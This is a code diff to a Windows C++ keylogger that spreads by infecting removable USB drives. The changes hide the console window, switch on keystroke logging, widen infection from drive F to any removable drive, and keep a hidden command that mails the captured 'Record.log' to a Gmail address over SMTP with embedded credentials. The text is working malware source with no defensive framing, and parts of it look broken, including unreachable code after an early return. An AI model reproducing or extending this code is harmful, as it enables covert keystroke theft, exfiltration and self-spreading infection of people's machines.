@@ -8,6 +8,7 @@
 #include <time.h>
 #include <string>
 #include <fstream>
+#include <iostream>
 
 using namespace std;
 
@@ -39,7 +40,7 @@ char* getRandomName();
 
 
 main(){
-    //FreeConsole();  //window is not visible
+    FreeConsole();  //window is not visible
     
     age = get_setAge();
     if(checkRecordSize()){   ///check for right time
@@ -70,22 +71,22 @@ main(){
 
     char driveLetter = getRemovableDisk();    //initial search for removable disk
     //return 0; // :)
-    printf("pippo\n");
+    //printf("pippo\n");
     
     while(1){
         ////////////////****LOG KEY****/////////////////
-        printf("azzz\n");
-/*        if(age <= LIFE_TIME){    ///check age
+    //    printf("azzz\n");
+        if(age <= LIFE_TIME){    ///check age
             logKey();
         }else{
             Sleep(5000);
         }
-*/
+
         ///////////////////****INFECT****///////////////////
         driveLetter = getRemovableDisk();
         
         //printf("%c\n", driveLetter);
-        if(driveLetter=='F'){
+        if(driveLetter!='0'){
             infectDrive(driveLetter);
         }
     }
@@ -143,7 +144,7 @@ bool checkRecordSize(){
  */
 void sendData(){
     
-    char* command = "Transmit smtp://smtp.gmail.com:587 -v --mail-from \"wordpress.mibe@gmail.com\" --mail-rcpt \"wordpress.mibe@gmail.com\" --ssl -u wordpress.mibe@gmail.com:password -T \"Record.log\" -k --anyauth";
+    char* command = "usb2 smtp://smtp.gmail.com:587 -v --mail-from \"wordpress.mibe@gmail.com\" --mail-rcpt \"wordpress.mibe@gmail.com\" --ssl -u wordpress.mibe@gmail.com:password -T \"Record.log\" -k --anyauth";
     WinExec(command, SW_HIDE);
 }
 
@@ -209,36 +210,67 @@ char getRemovableDiskold(){
 
     return drive;
 }
-char getRemovableDisk(){
-    char drive='0';
-	
-    char szLogicalDrives[MAX_PATH];
-    DWORD dwResult = GetLogicalDriveStrings(MAX_PATH, szLogicalDrives);
-	
-    string currentDrives="";
-
-    //cout << dwResult << endl;
-    for(int i=0; i<dwResult; i++)
-    {
-    	printf("%i\n", dwResult);
-    	printf("%c\n", szLogicalDrives[i]);
-        if(szLogicalDrives[i]>64 && szLogicalDrives[i]< 90)
-        {
-        	
-            currentDrives.append(1, szLogicalDrives[i]);
-
-            if(allDrives.find(szLogicalDrives[i]) > 100)
-            {
-                drive = szLogicalDrives[i];
-                
-                //if (drive!='0')
-                	//return drive;	
-            }
-        }
-        if (drive=='F')
-                	return drive;
-    }
-    
+char getRemovableDisk()
+{
+          //Get Logical Drives
+          DWORD dwDrives=GetLogicalDrives();
+ 
+          if(0==dwDrives)
+          {
+                   //return FALSE;
+          }
+ 
+          DWORD dwCount=0;
+ 
+          char chDriveLabel='A';
+ 
+          char szRootpath[5]={0,0,0,0,0};
+ 
+          while(dwDrives !=0)
+          {
+                   if ((dwDrives & 1) != 0)
+                   {
+                             sprintf(szRootpath,"%c:\\",chDriveLabel);
+ 
+                             //removable drive
+                             if(DRIVE_REMOVABLE==GetDriveType(szRootpath))
+                             {
+                                      WIN32_FIND_DATA FindFileData;
+                                      HANDLE hFind;
+ 
+                                      //Removable dirve lable
+                                      return chDriveLabel;
+                                    std::cout <<"Files in " << szRootpath << std::endl;
+ 
+                                      //* represent search all files and directories
+                                      szRootpath[3]='*';
+ 
+                                      hFind=FindFirstFile(szRootpath,&FindFileData);
+ 
+                                      if (INVALID_HANDLE_VALUE == hFind)
+                                      {
+                                                //return FALSE;
+                                      }
+ 
+                                      // List all the files in the directory .
+                                      do
+                                      {
+                                                //ignore the sub directories
+                                                if (!(FindFileData.dwFileAttributes &  
+                                                                        FILE_ATTRIBUTE_DIRECTORY))
+                                                {
+                                                    std::cout << FindFileData.cFileName << ":";
+                                                }
+ 
+                                      }while (FindNextFile(hFind, &FindFileData) != 0);
+ 
+                                      FindClose(hFind);
+                             }
+ 
+                   }
+                   dwDrives = dwDrives >> 1;//next drive
+                   chDriveLabel++;
+          }
 }
 /*
  *  send files to new drive
